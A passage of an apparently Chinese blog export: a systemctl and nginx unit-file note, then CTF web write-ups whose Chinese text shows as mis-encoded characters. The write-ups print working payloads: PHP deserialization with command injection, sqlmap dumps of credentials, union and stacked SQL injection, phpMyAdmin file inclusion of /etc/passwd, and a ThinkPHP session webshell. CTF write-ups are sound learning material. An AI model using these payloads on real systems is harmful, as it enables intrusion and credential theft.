<h2 id="systemd-ç³»ç»Ÿä¸­ç®¡ç†è¿è¡Œçš„æœåŠ¡â€”â€”systemctl"><a href="#systemd-ç³»ç»Ÿä¸­ç®¡ç†è¿è¡Œçš„æœåŠ¡â€”â€”systemctl" class="headerlink" title="systemd ç³»ç»Ÿä¸­ç®¡ç†è¿è¡Œçš„æœåŠ¡â€”â€”systemctl"></a>systemd ç³»ç»Ÿä¸­ç®¡ç†è¿è¡Œçš„æœåŠ¡â€”â€”systemctl</h2><h3 id="æŸ¥çœ‹"><a href="#æŸ¥çœ‹" class="headerlink" title="æŸ¥çœ‹"></a>æŸ¥çœ‹</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#åˆ—å‡ºç³»ç»Ÿä¸­æœåŠ¡</span><br><span class="line">systemctl</span><br><span class="line">#æ ¹æ®ç±»å‹åˆ—å‡ºå•å…ƒ</span><br><span class="line">systemctl list-units --type service</span><br><span class="line">#æ ¹æ®çŠ¶æ€åˆ—å‡ºå•ä½</span><br><span class="line">systemctl list-unit-files --type service</span><br><span class="line">#æŸ¥çœ‹è¿è¡Œä¸­çš„æœåŠ¡</span><br><span class="line">systemctl | grep running</span><br><span class="line">#æŸ¥çœ‹ç³»ç»Ÿå¯åŠ¨æ—¶ä¼šè¢«å¯ç”¨çš„æœåŠ¡åˆ—è¡¨</span><br><span class="line">systemctl list-unit-files | grep enabled</span><br><span class="line">#æŸ¥çœ‹æŒ‡å®šæœåŠ¡</span><br><span class="line">systemctl | grep apache2</span><br><span class="line">or</span><br><span class="line">systemctl status apache2</span><br><span class="line">#æŒ‰èµ„æºä½¿ç”¨æƒ…å†µï¼ˆä»»åŠ¡ã€CPUã€å†…å­˜ã€è¾“å…¥å’Œè¾“å‡ºï¼‰åˆ—å‡ºæ§åˆ¶ç»„ï¼š</span><br><span class="line">systemd-cgtop</span><br></pre></td></tr></table></figure>
<ul>
<li><code>UNIT</code> ç›¸åº”çš„ systemd å•å…ƒåç§°</li>
<li><code>LOAD</code> ç›¸åº”çš„å•å…ƒæ˜¯å¦è¢«åŠ è½½åˆ°å†…å­˜ä¸­</li>
<li><code>ACTIVE</code> è¯¥å•å…ƒæ˜¯å¦å¤„äºæ´»åŠ¨çŠ¶æ€</li>
<li><code>SUB</code> è¯¥å•å…ƒæ˜¯å¦å¤„äºè¿è¡ŒçŠ¶æ€ï¼ˆLCTT è¯‘æ³¨ï¼šæ˜¯è¾ƒäº ACTIVE æ›´åŠ è¯¦ç»†çš„çŠ¶æ€æè¿°ï¼Œä¸åŒçš„å•å…ƒç±»å‹æœ‰ä¸åŒçš„çŠ¶æ€ã€‚ï¼‰</li>
<li><code>DESCRIPTION</code> å…³äºè¯¥å•å…ƒçš„ç®€çŸ­æè¿°</li>
</ul>
<h3 id="æ³¨å†ŒæœåŠ¡"><a href="#æ³¨å†ŒæœåŠ¡" class="headerlink" title="æ³¨å†ŒæœåŠ¡"></a>æ³¨å†ŒæœåŠ¡</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#é…ç½®æ–‡ä»¶ç›®å½•</span><br><span class="line">#systemctlè„šæœ¬ç›®å½•ï¼š</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;</span><br><span class="line">#ç³»ç»ŸæœåŠ¡ç›®å½•ï¼š</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;</span><br><span class="line">#ç”¨æˆ·æœåŠ¡ç›®å½•</span><br><span class="line">usr&#x2F;lib&#x2F;systemd&#x2F;user&#x2F;</span><br></pre></td></tr></table></figure>
<p>ç¬¬ä¸€æ­¥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">åœ¨&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;systemç›®å½•ä¸‹æ–°å»ºservice-name.serviceæ–‡ä»¶ï¼š</span><br><span class="line">#nginx.serviceæ–‡ä»¶ç¤ºä¾‹</span><br><span class="line"></span><br><span class="line"># Stop dance for nginx</span><br><span class="line"># &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">#</span><br><span class="line"># ExecStop sends SIGSTOP (graceful stop) to the nginx process.</span><br><span class="line"># If, after 5s (--retry QUIT&#x2F;5) nginx is still running, systemd takes control</span><br><span class="line"># and sends SIGTERM (fast shutdown) to the main process.</span><br><span class="line"># After another 5s (TimeoutStopSec&#x3D;5), and if nginx is alive, systemd sends</span><br><span class="line"># SIGKILL to all the remaining processes in the process group (KillMode&#x3D;mixed).</span><br><span class="line">#</span><br><span class="line"># nginx signals reference doc:</span><br><span class="line"># http:&#x2F;&#x2F;nginx.org&#x2F;en&#x2F;docs&#x2F;control.html</span><br><span class="line">#</span><br><span class="line">[Unit]</span><br><span class="line">#æœåŠ¡æè¿°</span><br><span class="line">Description&#x3D;A high performance web server and a reverse proxy server</span><br><span class="line">Documentation&#x3D;man:nginx(8)</span><br><span class="line">#æŒ‡å®šäº†åœ¨systemdåœ¨æ‰§è¡Œå®Œé‚£äº›targetä¹‹åå†å¯åŠ¨è¯¥æœåŠ¡</span><br><span class="line">After&#x3D;network.target nss-lookup.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">#å®šä¹‰Serviceçš„è¿è¡Œç±»å‹ï¼Œä¸€èˆ¬æ˜¯forking(åå°è¿è¡Œ)  </span><br><span class="line">Type&#x3D;forking</span><br><span class="line">PIDFile&#x3D;&#x2F;run&#x2F;nginx.pid</span><br><span class="line">#å®šä¹‰systemctl start|stop|reload *.service çš„æ‰§è¡Œæ–¹æ³•ï¼ˆå…·ä½“å‘½ä»¤éœ€è¦å†™ç»å¯¹è·¯å¾„ï¼‰</span><br><span class="line">#å¯åŠ¨å‰æ‰§è¡Œçš„å‘½ä»¤</span><br><span class="line">ExecStartPre&#x3D;&#x2F;usr&#x2F;sbin&#x2F;nginx -t -q -g &#39;daemon on; master_process on;&#39;</span><br><span class="line">#å¯åŠ¨æ—¶æ‰§è¡Œçš„å‘½ä»¤</span><br><span class="line">ExecStart&#x3D;&#x2F;usr&#x2F;sbin&#x2F;nginx -g &#39;daemon on; master_process on;&#39;</span><br><span class="line">#é‡å¯æ—¶æ‰§è¡Œçš„å‘½ä»¤</span><br><span class="line">ExecReload&#x3D;&#x2F;usr&#x2F;sbin&#x2F;nginx -g &#39;daemon on; master_process on;&#39; -s reload</span><br><span class="line">#åœæ­¢æ—¶æ‰§è¡Œçš„å‘½ä»¤</span><br><span class="line">ExecStop&#x3D;-&#x2F;sbin&#x2F;start-stop-daemon --quiet --stop --retry QUIT&#x2F;5 --pidfile &#x2F;run&#x2F;nginx.pid</span><br><span class="line">#åœæ­¢æœåŠ¡æ—¶çš„ç­‰å¾…çš„ç§’æ•°,å¦‚æœè¶…è¿‡è¿™ä¸ªæ—¶é—´æœåŠ¡ä»ç„¶æ²¡æœ‰åœæ­¢,systemdä¼šä½¿ç”¨SIGKILLä¿¡å·å¼ºè¡Œæ€æ­»æœåŠ¡çš„è¿›ç¨‹ã€‚ </span><br><span class="line">TimeoutStopSec&#x3D;5</span><br><span class="line">KillMode&#x3D;mixed</span><br><span class="line">#åˆ›å»ºç§æœ‰çš„å†…å­˜ä¸´æ—¶ç©ºé—´</span><br><span class="line">PrivateTmp&#x3D;True</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">#å¤šç”¨æˆ·</span><br><span class="line">WantedBy&#x3D;multi-user.target</span><br></pre></td></tr></table></figure>
<p>ç¬¬äºŒæ­¥</p>
<p>æ”¹æƒé™</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod 754 æ–‡ä»¶å</span><br></pre></td></tr></table></figure>
<p>ç¬¬ä¸‰æ­¥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#é‡è½½ç³»ç»ŸæœåŠ¡ï¼š</span><br><span class="line">systemctl daemon-reload</span><br><span class="line">#ä¸€äº›å‘½ä»¤</span><br><span class="line">#è®¾ç½®å¼€æœºå¯åŠ¨ï¼š</span><br><span class="line">systemctl enable *.service</span><br><span class="line">#å¯åŠ¨æœåŠ¡ï¼š</span><br><span class="line">systemctl start *.service</span><br><span class="line">#åœæ­¢æœåŠ¡ï¼š</span><br><span class="line">systemctl stop *.service</span><br><span class="line">#é‡å¯æœåŠ¡ï¼š</span><br><span class="line">systemctl reload *.service</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Note</category>
      </categories>
      <tags>
        <tag>Note</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>åˆå¤©å¾¡å®…æˆ˜ç–«-web-wp</title>
    <url>/2020/02/29/CTF_WP/hetian/</url>
    <content><![CDATA[<h1 id="åˆå¤©å¾¡å®…æˆ˜ç–«-web-wp"><a href="#åˆå¤©å¾¡å®…æˆ˜ç–«-web-wp" class="headerlink" title="åˆå¤©å¾¡å®…æˆ˜ç–«-web-wp"></a>åˆå¤©å¾¡å®…æˆ˜ç–«-web-wp</h1><h2 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h2><a id="more"></a>

<p>å¦‚å›¾æ‰€ç¤º</p>
<p><a href="https://blogjpg.yanmy.top/blog/20200229/q0Oocw0yWWOb.jpg?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200229/q0Oocw0yWWOb.jpg?imageslim" alt="mark"></a></p>
<p>æ”¹æˆkey{XXXX}æäº¤</p>
<h2 id="è„‘è¢‹æœ‰ç‚¹å¤§"><a href="#è„‘è¢‹æœ‰ç‚¹å¤§" class="headerlink" title="è„‘è¢‹æœ‰ç‚¹å¤§"></a>è„‘è¢‹æœ‰ç‚¹å¤§</h2><p>ç”¨bpæŠ“åŒ…,åœ¨å“åº”ä¸­æ‰¾åˆ°key</p>
<p><a href="https://blogjpg.yanmy.top/blog/20200229/dFQYs1BGYQOz.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200229/dFQYs1BGYQOz.png?imageslim" alt="mark"></a></p>
<p><a href="https://blogjpg.yanmy.top/blog/20200229/IORN4qHb421z.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200229/IORN4qHb421z.png?imageslim" alt="mark"></a></p>
<h2 id="ç»Ÿä¸€ç™»å½•"><a href="#ç»Ÿä¸€ç™»å½•" class="headerlink" title="ç»Ÿä¸€ç™»å½•"></a>ç»Ÿä¸€ç™»å½•</h2><p>æ‰“å¼€ç•Œé¢,è¦ç™»é™†,ç™»å½•ä¸ä¸Š,ç”¨dirmapæ‰«ä¸€ä¸‹ç›®å½•</p>
<p><a href="https://blogjpg.yanmy.top/blog/20200229/TskYQljtjGHy.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200229/TskYQljtjGHy.png?imageslim" alt="mark"></a></p>
<p>æ‰¾åˆ°æºç æ³„éœ²,ä¸‹è½½ä¸‹æ¥</p>
<p>ä»£ç å®¡è®¡</p>
<p>åœ¨commonæ–‡ä»¶å¤¹ä¸‹æ‰¾åˆ°home.php,wakeupå‡½æ•°æœ‰ä¸€ä¸ªwafè¿‡æ»¤,æœ€ä¸‹æ–¹çš„</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$a&#x3D;@$_POST[&#39;a&#39;];</span><br><span class="line">@unserialize($a);</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥æƒ³åˆ°æ„é€ ååºåˆ—åŒ–å¯¹è±¡,ç›´æ¥æ‰§è¡Œæˆ‘ä»¬æ„é€ çš„å¯¹è±¡,åˆ©ç”¨systemå‡½æ•°,homeåé¢çš„æ•°å­—å¤§äº2å¯ä»¥ç»•è¿‡wakeupå‡½æ•°ä»è€Œç»•è¿‡è¿‡æ»¤</p>
<p>æ„é€ payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#x3D;O:4:&quot;home&quot;:3:&#123;s:12:&quot;%00home%00method&quot;;s:4:&quot;ping&quot;;s:10:&quot;%00home%00args&quot;;a:1:&#123;i:0;s:26:&quot;127.0.0.1;cat &#x2F;opt&#x2F;key.txt&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>
<p><a href="https://blogjpg.yanmy.top/blog/20200229/Yj8LhB4w1QSC.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200229/Yj8LhB4w1QSC.png?imageslim" alt="mark"></a></p>
<h2 id="åå°key"><a href="#åå°key" class="headerlink" title="åå°key"></a>åå°key</h2><p><a href="https://blogjpg.yanmy.top/blog/20200229/kX2mbF9SLn2B.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200229/kX2mbF9SLn2B.png?imageslim" alt="mark"></a></p>
<p>å­˜åœ¨æ•°å­—å‹sqlæ³¨å…¥</p>
<p>ç”¨sqlmapè·‘ä¸€ä¸‹</p>
<p>çˆ†åº“</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;118.190.100.227:5001&#x2F;?r&#x3D;content&amp;cid&#x3D;1&quot;  -p &quot;cid&quot; --dbs</span><br></pre></td></tr></table></figure>
<p><a href="https://blogjpg.yanmy.top/blog/20200229/BE5Um90VnzOE.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200229/BE5Um90VnzOE.png?imageslim" alt="mark"></a></p>
<p>çˆ†è¡¨</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;118.190.100.227:5001&#x2F;?r&#x3D;content&amp;cid&#x3D;1&quot;  -p &quot;cid&quot; -D seacms --tables</span><br></pre></td></tr></table></figure>
<p><a href="https://blogjpg.yanmy.top/blog/20200229/hLkw8QttXHQP.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200229/hLkw8QttXHQP.png?imageslim" alt="mark"></a></p>
<p>çˆ†å­—æ®µ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;118.190.100.227:5001&#x2F;?r&#x3D;content&amp;cid&#x3D;1&quot;  -p &quot;cid&quot; -D seacms -T manage --columns</span><br></pre></td></tr></table></figure>
<p><a href="https://blogjpg.yanmy.top/blog/20200229/i8fCB3zOQGEY.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200229/i8fCB3zOQGEY.png?imageslim" alt="mark"></a></p>
<p>çˆ†å†…å®¹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;118.190.100.227:5001&#x2F;?r&#x3D;content&amp;cid&#x3D;1&quot;  -p &quot;cid&quot; -D seacms -T manage -C user,password --dump</span><br></pre></td></tr></table></figure>
<p><a href="https://blogjpg.yanmy.top/blog/20200229/fM6cHxBQX6As.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200229/fM6cHxBQX6As.png?imageslim" alt="mark"></a></p>
<p><a href="https://blogjpg.yanmy.top/blog/20200229/pTU7n82U9Swj.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200229/pTU7n82U9Swj.png?imageslim" alt="mark"></a></p>
<p>å¾—åˆ°ç”¨æˆ·åå’Œå¯†ç å,ç”±äºå¯†ç MD5åŠ å¯†äº†,æ‰€ä»¥ç”¨md5è§£å¯†ä¸€ä¸‹,å¾—åˆ°å¯†ç ç™»å½•ç³»ç»Ÿ,æ ¹æ®æç¤ºæ‰¾åˆ°key</p>
<p><a href="https://blogjpg.yanmy.top/blog/20200229/Ppjbm5Y8SrTk.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200229/Ppjbm5Y8SrTk.png?imageslim" alt="mark"></a></p>
<h2 id="åå°ç™»å½•"><a href="#åå°ç™»å½•" class="headerlink" title="åå°ç™»å½•"></a>åå°ç™»å½•</h2><p><a href="https://blogjpg.yanmy.top/blog/20200229/4pCgjJT5hHRV.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200229/4pCgjJT5hHRV.png?imageslim" alt="mark"></a></p>
<p>æ‰“å¼€å‘ç°é™æ­¢è®¿é—®,ä½†æ˜¯å“åº”ç ä¸º200è¯´æ˜å¯èƒ½å› ä¸ºæ˜¯åå°ç™»å½•ç³»ç»Ÿåšäº†é™åˆ¶,æ”¹xffå¤´åé¡ºåˆ©è®¿é—®</p>
<p><a href="https://blogjpg.yanmy.top/blog/20200229/HK6RCODAJsFr.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200229/HK6RCODAJsFr.png?imageslim" alt="mark"></a></p>
<p>ä½¿ç”¨ä¸‡èƒ½å¯†ç ç™»å½•,æˆåŠŸè·å–key</p>
<p><a href="https://blogjpg.yanmy.top/blog/20200229/hznWs2Nj07se.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200229/hznWs2Nj07se.png?imageslim" alt="mark"></a></p>
<p><a href="https://blogjpg.yanmy.top/blog/20200229/F2DufvYCsrhm.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200229/F2DufvYCsrhm.png?imageslim" alt="mark"></a></p>
<h2 id="phpmyadmin"><a href="#phpmyadmin" class="headerlink" title="phpmyadmin"></a>phpmyadmin</h2><p><a href="https://blogjpg.yanmy.top/blog/20200229/MybinCxjXJSb.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200229/MybinCxjXJSb.png?imageslim" alt="mark"></a></p>
<p>æ ¹ç›®å½•ä¸‹é¢çš„robots.txtæŒ‡æ˜äº†keyçš„ä½ç½®</p>
<p>é€šè¿‡å¢åŠ å¸¸ç”¨æ–‡ä»¶åphpmyadmin,æˆåŠŸæ‰¾åˆ°ç™»å½•åœ°å€</p>
<p>ç”¨å¼±å£ä»¤root/rootç™»å½•å,å…ˆå°è¯•åŒ…å«/etc/passwdåˆ¤æ–­ç›®å½•å±‚çº§</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;114.215.40.251:5002&#x2F;phpmyadmin&#x2F;index.php?a&#x3D;phpinfo();&amp;target&#x3D;export.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
<p><a href="https://blogjpg.yanmy.top/blog/20200229/V7A676OjqiFP.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200229/V7A676OjqiFP.png?imageslim" alt="mark"></a></p>
<p>ç„¶åå†å»åŒ…å«key</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;114.215.40.251:5002&#x2F;phpmyadmin&#x2F;index.php?a&#x3D;phpinfo();&amp;target&#x3D;export.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;opt&#x2F;key.txt</span><br></pre></td></tr></table></figure>
<p><a href="https://blogjpg.yanmy.top/blog/20200229/5KWYUpGJCx4T.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200229/5KWYUpGJCx4T.png?imageslim" alt="mark"></a></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>WP</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title>GYCTFâ€”â€”2020iæ˜¥ç§‹æ–°æ˜¥æˆ˜ç–«CTFâ€”â€”ç½‘ç»œå®‰å…¨å…¬ç›Šèµ›</title>
    <url>/2020/02/25/CTF_WP/gyctf_wp/</url>
    <content><![CDATA[<h1 id="GYCTFâ€”â€”2020iæ˜¥ç§‹æ–°æ˜¥æˆ˜ç–«CTFâ€”â€”ç½‘ç»œå®‰å…¨å…¬ç›Šèµ›"><a href="#GYCTFâ€”â€”2020iæ˜¥ç§‹æ–°æ˜¥æˆ˜ç–«CTFâ€”â€”ç½‘ç»œå®‰å…¨å…¬ç›Šèµ›" class="headerlink" title="GYCTFâ€”â€”2020iæ˜¥ç§‹æ–°æ˜¥æˆ˜ç–«CTFâ€”â€”ç½‘ç»œå®‰å…¨å…¬ç›Šèµ›"></a>GYCTFâ€”â€”2020iæ˜¥ç§‹æ–°æ˜¥æˆ˜ç–«CTFâ€”â€”ç½‘ç»œå®‰å…¨å…¬ç›Šèµ›</h1><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="code-in-morse"><a href="#code-in-morse" class="headerlink" title="code_in_morse"></a>code_in_morse</h3><p>ä¸‹è½½ä¸‹æ¥æ˜¯å‹ç¼©åŒ…,è§£å‹æ˜¯æµé‡åŒ…,ç”¨wiresharkåˆ†æ,è¿‡æ»¤http</p>
<p>å‘ç°ä¸Šä¼ æ–‡ä»¶çš„upload.php,è·Ÿè¸ªæµé‡Œé¢æ˜¯morseç ,morseè§£ç æ˜¯ä¸€å †å­—æ¯åŠ æ•°å­—,å¾ˆåƒbase64,ä½†æ˜¯å…¶ä¸­æ²¡æœ‰1æ²¡æœ‰8æ•°å­—åªè¦2-7,å› ä¸ºä¸Šä¼ çš„æ˜¯æ–‡ä»¶,base32è§£ç æˆæ–‡ä»¶,ä¸‹é¢è¿™ä¸ªå·¥å…·è§£ç å¾—åˆ°ä¸€ä¸ªå›¾ç‰‡</p>
<a id="more"></a>

<p><a href="https://emn178.github.io/online-tools/base32_decode_file.html">Base32 Decode File</a></p>
<p>å›¾ç‰‡ä¸çŸ¥é“æ˜¯ä»€ä¹ˆ,ç”¨googleè¯†å›¾æœç´¢åå‘ç°ä¸€ç§å¾ˆç±»ä¼¼çš„æ¡å½¢ç æ ¼å¼PDF417,éšè®¤ä¸ºæ˜¯è¯¥ç§æ¡å½¢ç ,ç”¨ä¸€ä¸‹å·¥å…·è¿›è¡Œè¯†åˆ«,è¯†åˆ«å‡ºä¸€ä¸ªç½‘ç«™,ç½‘ç«™æ˜¯ä¸€å¼ å›¾ç‰‡</p>
<p><a href="https://blogjpg.yanmy.top/blog/20200224/yz1DwxX4ETFj.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200224/yz1DwxX4ETFj.png?imageslim" alt="mark"></a></p>
<p><a href="https://online-barcode-reader.inliteresearch.com/">æ¡å½¢ç äºŒç»´ç è¯†åˆ«</a></p>
<p><a href="https://blogjpg.yanmy.top/blog/20200224/s4EqXhqUH5Lx.jpg?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200224/s4EqXhqUH5Lx.jpg?imageslim" alt="mark"></a></p>
<p>Stegsolveåˆ†ææ–‡ä»¶æ ¼å¼å‡ºç°F5,æ˜¯F5éšå†™,ç”¨GitHubçš„F5éšå†™å·¥å…·è§£å¯†,æ²¡æœ‰å¯†ç ,å¾—åˆ°flag</p>
<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="ç®€å•çš„æ‹›è˜ç³»ç»Ÿ"><a href="#ç®€å•çš„æ‹›è˜ç³»ç»Ÿ" class="headerlink" title="ç®€å•çš„æ‹›è˜ç³»ç»Ÿ"></a>ç®€å•çš„æ‹›è˜ç³»ç»Ÿ</h3><p>è¿™ä¸ªé¢˜æ‹¿åˆ°æ‰‹å…ˆæ˜¯ä¸€ä¸ªç™»å½•æ¡†,å°è¯•äº†ä¸‡èƒ½å¯†ç ä»€ä¹ˆçš„å‘ç°æ€»æ˜¯æœªçŸ¥é”™è¯¯,ä»¥ä¸ºæ˜¯æˆ‘çš„åŸå› ,ç»ç¾¤é‡Œå¤§ä½¬æé†’å®¹å™¨ä¸ç¨³å®š,é‡æ–°ä¸‹å‘,å‘ç°ä¸‡èƒ½å¯†ç ç™»å½•æˆåŠŸ</p>
<p>æµè§ˆå„ä¸ªé¡µé¢å‘ç°AdminPageæœ‰ä¸€ä¸ªserach for keyçš„æŸ¥è¯¢æ¡†</p>
<p><a href="https://blogjpg.yanmy.top/blog/20200223/tX2ll5OsA5JH.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200223/tX2ll5OsA5JH.png?imageslim" alt="mark"></a></p>
<p>å°è¯•sqlæ³¨å…¥,æœ‰å›æ˜¾,æœ‰é”™è¯¯æç¤º,ç›´æ¥æœ‰å›æ˜¾çš„sqlæ³¨å…¥ä¸€å¥—,å¾—flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39; or 1&#x3D;1 order by 5#</span><br><span class="line">&#39; or 1&#x3D;1 order by 6#</span><br><span class="line">#5æœ‰å›æ˜¾,6æ²¡æœ‰</span><br><span class="line"></span><br><span class="line">&#39; or 1&#x3D;1 union select 1,2,3,4,5#</span><br><span class="line">#adminå˜æˆ2,è¾“å‡ºä½ç½®åœ¨2</span><br><span class="line"></span><br><span class="line">&#39; or 1&#x3D;1 union select 1,group_concat(database()),3,4,5#</span><br><span class="line">#æŸ¥åº“</span><br><span class="line"></span><br><span class="line">&#39; or 1&#x3D;1 union select 1,group_concat(table_name),3,4,5 from information_schema.tables where table_schema&#x3D;database()#</span><br><span class="line">#æŸ¥è¡¨</span><br><span class="line"></span><br><span class="line">&#39; or 1&#x3D;1 union select 1,group_concat(column_name),3,4,5 from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;flag&#39;#</span><br><span class="line">#æŸ¥å­—æ®µ</span><br><span class="line"></span><br><span class="line">&#39; or 1&#x3D;1 union select 1,group_concat(flaaag),3,4,5 from flag#</span><br><span class="line">#æŸ¥å†…å®¹</span><br></pre></td></tr></table></figure>
<h3 id="equpload"><a href="#equpload" class="headerlink" title="equpload"></a>equpload</h3><p>è¿™ä¸ªé¢˜ä¹Ÿå¾ˆç®€å•,ç›´æ¥ä¸Šä¼ ä¸€å¥è¯getshell,è¯»å–æ ¹ç›®å½•ä¸‹é¢çš„flag</p>
<p>(æ²¡æœ‰ä»»ä½•è¿‡æ»¤?ä¸çŸ¥é“æ˜¯ä¸æ˜¯ä¸»åŠæ–¹çš„å¤±è¯¯,æ— ä»å¾—çŸ¥)</p>
<h3 id="blacklist"><a href="#blacklist" class="headerlink" title="blacklist"></a>blacklist</h3><p>è¿‡æ»¤äº†set|prepare|alter|rename|select|update|delete|drop|insert|where|</p>
<p>ä½†æ˜¯mysqlè¿˜æœ‰ä¸€ç§æŸ¥è¯¢å§¿åŠ¿</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;show tables;</span><br><span class="line">#æŸ¥è¡¨</span><br><span class="line">1&#39;;desc FlagHere;</span><br><span class="line">#æŸ¥å­—æ®µ</span><br><span class="line">1&#39;;handler FlagHere open;handler FlagHere read first;handler FlagHere close;#</span><br><span class="line">#è¯»å–å†…å®¹</span><br></pre></td></tr></table></figure>
<h3 id="easy-thinking"><a href="#easy-thinking" class="headerlink" title="easy_thinking"></a>easy_thinking</h3><p>è¿™ä¸ªåˆ©ç”¨çš„æ˜¯ThinkPHP&lt;6.0.2çš„ä¸€ä¸ªä»»æ„æ–‡ä»¶å†…å®¹å†™å…¥è¦†ç›–æ¼æ´</p>
<p>å¯ä»¥é€šè¿‡æ§åˆ¶cookiesä¸­çš„PHPSESSIONIDå­—æ®µå†…å®¹æ¥è¾¾åˆ°æ§åˆ¶sessionç›®å½•ä¸‹ç”Ÿæˆçš„æ–‡ä»¶å</p>
<p>è¯¦æƒ…å¯ä»¥æŸ¥çœ‹</p>
<p><a href="https://zhzhdoai.github.io/2020/01/25/ThinkPHP-6-0-2%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E5%86%99%E5%85%A5-%E8%A6%86%E7%9B%96/">ThinkPHP&lt;6.0.2ä»»æ„æ–‡ä»¶å†…å®¹å†™å…¥/è¦†ç›–</a></p>
<p>ç½‘ç«™ç›®å½•ä¸‹æœ‰<a href="http://www.zip.ä¸‹è½½ä¸‹æ¥æŸ¥çœ‹æ§åˆ¶å™¨æ–‡ä»¶,å‘ç°sessionæ–‡ä»¶å†…å®¹å­˜å‚¨çš„æ˜¯æŸ¥è¯¢é¡µçš„keyå€¼/">www.zip.ä¸‹è½½ä¸‹æ¥æŸ¥çœ‹æ§åˆ¶å™¨æ–‡ä»¶,å‘ç°sessionæ–‡ä»¶å†…å®¹å­˜å‚¨çš„æ˜¯æŸ¥è¯¢é¡µçš„keyå€¼</a></p>
<p><a href="https://blogjpg.yanmy.top/blog/20200224/ukzBO4Dx1y7G.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200224/ukzBO4Dx1y7G.png?imageslim" alt="mark"></a></p>
<p>æ³¨å†Œ,ç™»å½•,æ„é€ æŸ¥è¯¢é¡µé¢çš„keyä¸ºä¸€å¥è¯æœ¨é©¬,cookiesä¸‹é¢çš„PHPSESSIONIDå­—æ®µPHPSESSID=1234567890123456789012345678.php</p>
<p>ç„¶åè®¿é—®ç”¨èšå‰‘é“¾æ¥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;123.57.212.112:7891&#x2F;runtime&#x2F;session&#x2F;sess_1234567890123456789012345678.php</span><br></pre></td></tr></table></figure>
<p>getshell</p>
<p>æŸ¥çœ‹php.iniæ˜¯ç¦ç”¨äº†ç³»ç»Ÿæ‰§è¡Œå‡½æ•°çš„,è¿™æ—¶éœ€è¦ä½¿ç”¨èšå‰‘çš„ç»•è¿‡disable_functionçš„æ’ä»¶é€‰æ‹©æ¨¡å¼è¿›è¡Œé“¾æ¥,æˆåŠŸç»•è¿‡disable_functionåå³å¯æ‰§è¡Œæ ¹ç›®å½•ä¸‹é¢readflag</p>
